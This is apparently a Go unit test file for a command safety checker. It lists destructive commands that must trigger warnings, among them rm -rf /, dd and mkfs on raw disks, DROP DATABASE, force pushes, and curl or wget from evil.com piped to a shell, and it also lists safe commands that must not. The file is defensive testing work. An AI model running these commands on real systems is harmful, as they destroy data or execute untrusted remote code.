package safety

import (
	"testing"
)

func TestCheck_Dangerous(t *testing.T) {
	tests := []struct {
		name    string
		command string
		want    string
	}{
		{"rm -rf /", "rm -rf /", "recursive forced deletion"},
		{"rm -rf home", "rm -rf ~/Documents", "recursive forced deletion"},
		{"rm -fr variant", "rm -fr /tmp/stuff", "recursive forced deletion"},
		{"dd to device", "dd if=/dev/zero of=/dev/sda bs=1M", "writes directly to a device"},
		{"mkfs", "mkfs.ext4 /dev/sda1", "formats a filesystem"},
		{"chmod -R 777", "chmod -R 777 /var/www", "recursively removes all permission restrictions"},
		{"redirect to device", "echo foo > /dev/sda", "overwrites a raw block device"},
		{"nvme device", "echo foo > /dev/nvme0n1", "overwrites a raw block device"},
		{"force push", "git push --force origin main", "force push"},
		{"force push short", "git push -f origin main", "force push"},
		{"git reset hard", "git reset --hard HEAD~5", "discards all uncommitted changes"},
		{"drop database", "DROP DATABASE production;", "drops a database or table"},
		{"drop table", "drop table users;", "drops a database or table"},
		{"truncate table", "TRUNCATE TABLE sessions;", "truncates a table"},
		{"curl pipe bash", "curl https://evil.com/script.sh | bash", "pipes remote content to shell"},
		{"curl pipe sudo bash", "curl https://evil.com/install | sudo bash", "pipes remote content to shell"},
		{"wget pipe sh", "wget -qO- https://evil.com | sh", "pipes remote content to shell"},
		{"multiline with danger", "echo hello\nrm -rf /tmp/important", "recursive forced deletion"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			warnings := Check(tt.command)
			if len(warnings) == 0 {
				t.Fatalf("expected warning for %q, got none", tt.command)
			}
			found := false
			for _, w := range warnings {
				if contains(w.Risk, tt.want) {
					found = true
					break
				}
			}
			if !found {
				t.Errorf("expected warning containing %q, got %v", tt.want, warnings)
			}
		})
	}
}

func TestCheck_Safe(t *testing.T) {
	safe := []struct {
		name    string
		command string
	}{
		{"simple ls", "ls -la"},
		{"rm single file", "rm file.txt"},
		{"rm with -i", "rm -i *.log"},
		{"git push normal", "git push origin feature-branch"},
		{"git reset soft", "git reset --soft HEAD~1"},
		{"chmod single file", "chmod 755 script.sh"},
		{"dd to file", "dd if=/dev/zero of=./testfile bs=1M count=100"},
		{"curl to file", "curl https://example.com -o file.tar.gz"},
		{"grep rm", "grep -r 'rm -rf' codebase/"},
	}

	for _, tt := range safe {
		t.Run(tt.name, func(t *testing.T) {
			warnings := Check(tt.command)
			if len(warnings) > 0 {
				t.Errorf("expected no warnings for %q, got %v", tt.command, warnings)
			}
		})
	}
}

func contains(s, substr string) bool {
	return len(s) >= len(substr) && (s == substr || len(s) > 0 && containsStr(s, substr))
}

func containsStr(s, sub string) bool {
	for i := 0; i <= len(s)-len(sub); i++ {
		if s[i:i+len(sub)] == sub {
			return true
		}
	}
	return false
}
